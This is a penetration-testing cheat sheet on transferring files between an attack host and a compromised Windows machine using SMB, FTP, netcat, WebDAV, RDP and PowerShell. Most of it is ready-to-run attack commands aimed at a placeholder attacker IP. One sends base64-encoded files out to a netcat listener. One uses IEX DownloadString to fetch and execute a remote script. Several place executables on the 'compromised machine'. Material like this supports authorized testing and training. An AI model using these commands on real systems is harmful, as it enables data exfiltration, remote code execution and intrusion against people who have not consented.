---
legal-banner: true
---

### **UPLOADING FILES VIA SMB (NO CREDENITIAL)**

1.  Setting Up an SMB Server:  
    `sudo impacket-smbserver hackfast -smb2support .`
2.  Map a Network Drive:  
    `net use z: \\[IP-ADRESS]\hackfast`
3.  Upload a File via SMB:   
    `copy file.txt z:\file.txt`

### **UPLOADING FILES VIA SMB (WITH CREDENTIALS)**

3.  Configure SMB Server Using impacket-smbserver  
    `sudo impacket-smbserver hackfast $(pwd) -smb2support -user hackfast -password hackfast`
4.  Configure SMB Server Using smbserver.py  
    `smbserver.py share . -smb2support -username hackfast -password hackfast`
5.  Map a Network Drive:  
    `net use z: \\[IP-ADRESS]\hackfast /user:hackfast hackfast`
6.  Upload File to Mapped Drive:  
    `copy file.txt z:\file.txt`

### **UPLOADING FILES VIA FTP**

1.  Setting Up Write-Enabled FTP Server:  
    `sudo python3 -m pyftpdlib --port 21 --write`
2.  Upload File Using PowerShell:  
    `(New-Object Net.WebClient).UploadFile('ftp://[IP-ADRESS]/file.txt', 'C:\Windows\Temp\file.txt')`
3.  Automating FTP Upload with Command File:  
    
    ![](../../img/Windows-Environment/1.png)

### **POWERSHELL BASE64 WEB UPLOAD WITH NETCAT**

1.  Encode the File to Base64 (On Windows):  
    `$filePath = 'C:\Windows\Temp\file_name'`  
    `$b64 = [System.Convert]::ToBase64String((Get-Content -Path $filePath -Encoding Byte))`
2.  Set Up the Netcat Listener to Capture the POST Request:  
    `nc -lvnp 8080 > received_b64.txt`
3.  Upload the Base64 String via HTTP POST:  
    `Invoke-WebRequest -Uri http://[IP-ADRESS]:8080/ -Method POST -Body $b64`
4.  Decode the Base64 String Received via Netcat:  
    `cat received_b64.txt | base64 -d > file_name`

### **UPLOADING A FILE TO A REMOTE SESSION**

1.  Create a PowerShell Remoting session:  
    `$Session = New-PSSession -ComputerName DATABASE01`
2.  Copy the file from your local machine to the remote session:  
    `Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\`

### **UPLOADING FILES VIA WEBDAV**

1.  Install WebDav Server  
    `sudo pip3 install wsgidav cheroot`
2.  Start the WebDav Server  
    `sudo wsgidav --host=0.0.0.0 --port=8081 --root=/tmp --auth=anonymous`
3.  List Directory Contents:  
    `dir \\[IP-ADRESS]\DavWWWRoot`
4.  Copy File to WebDav Server:  
    `copy C:\Temp\file.zip \\[IP_ADRESS]\DavWWWRoot\`

### **NC UPLOADING A FILE (SENDING)**

- **ON THE ATTACK HOST (LISTENING):**
    
    1.  Using Netcat  
        `sudo nc -l -p 443 -q 0 < file_to_send.exe`
    2.  Using Ncat  
        `sudo ncat -l -p 443 --send-only < file_to_send.exe`
- **ON THE COMPROMISED MACHINE (CONNECTING):**
    
    1.  Using Netcat  
        `nc [IP-ADRESS] 443 > received_file.exe`
    2.  Using Ncat  
        `ncat [IP-ADRESS] 443 --recv-only > received_file.exe`

### **UPLOADING A FILE USING RDP (LINUX TO WINDOWS)**

1.  Using rdesktop:  
    `rdesktop [IP-ADDRESS] -u [USERNAME] -p [PASSWORD] -r disk:linux='/home/user/rdesktop/files`
2.  Using xfreerdp:  
    `xfreerdp /v:[IP-ADDRESS] /u:[USERNAME] /p:'[PASSWORD]' /drive:[NAME],[PATH]`

### **UPLOADING FILES USING POWERSHELL**

1.  `IEX(New-Object Net.WebClient).DownloadString('http://[IP-ADRESS]:8000/PSUpload.ps1')`
    
2.  `Invoke-FileUpload -Uri http://[IP-ADRESS]:8080/upload -File C:\Windows\Temp\file_name`